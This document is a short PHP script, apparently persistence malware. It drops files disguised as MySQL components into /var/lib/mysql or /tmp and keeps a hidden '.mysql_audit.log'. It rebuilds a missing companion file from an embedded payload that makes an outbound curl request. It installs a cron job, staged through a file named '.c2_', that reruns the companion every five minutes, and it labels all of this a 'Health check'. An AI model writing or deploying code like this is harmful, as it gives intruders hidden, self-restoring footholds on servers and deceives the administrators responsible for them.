<?php
$targetDir = (is_writable("/var/lib/mysql/")) ? "/var/lib/mysql/" : "/tmp/";
$sysHash = substr(md5(gethostname()), 0, 4);
$name1 = "mysql_daemon_" . $sysHash . ".php";
$name2 = "mysql_lib_" . $sysHash . ".php";
$path1 = $targetDir . $name1;
$path2 = $targetDir . $name2;
$logFile = $targetDir . ".mysql_audit.log";

function writeLog($msg) {
    global $logFile;
    file_put_contents($logFile, "[" . date("Y-m-d H:i:s") . "] [FILE2]: $msg\n", FILE_APPEND);
}

$offline_file1 = '<?php
$dir = (is_writable("/var/lib/mysql/")) ? "/var/lib/mysql/" : "/tmp/";
$h = substr(md5(gethostname()), 0, 4);
$p1 = $dir . "mysql_daemon_" . $h . ".php";
$ch = curl_init("https://google.com");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_exec($ch);
file_put_contents($dir . ".mysql_audit.log", "[" . date("Y-m-d H:i:s") . "] [FILE1]: Restored and working\n", FILE_APPEND);
?>';

if (!file_exists($path1)) {
    writeLog("CRITICAL: File1 missing! Offline recovery initiated.");
    file_put_contents($path1, $offline_file1);
    chmod($path1, 0755);
}

$currentCron = shell_exec("crontab -l 2>/dev/null");
if (strpos($currentCron, $name2) === false) {
    $tmpCron = "/tmp/.c2_" . $sysHash;
    file_put_contents($tmpCron, $currentCron . "\n*/5 * * * * /usr/bin/php $path2 > /dev/null 2>&1\n");
    exec("crontab $tmpCron && rm $tmpCron");
    writeLog("Fixed Crontab for File2");
}

writeLog("Health check finished.");
?>
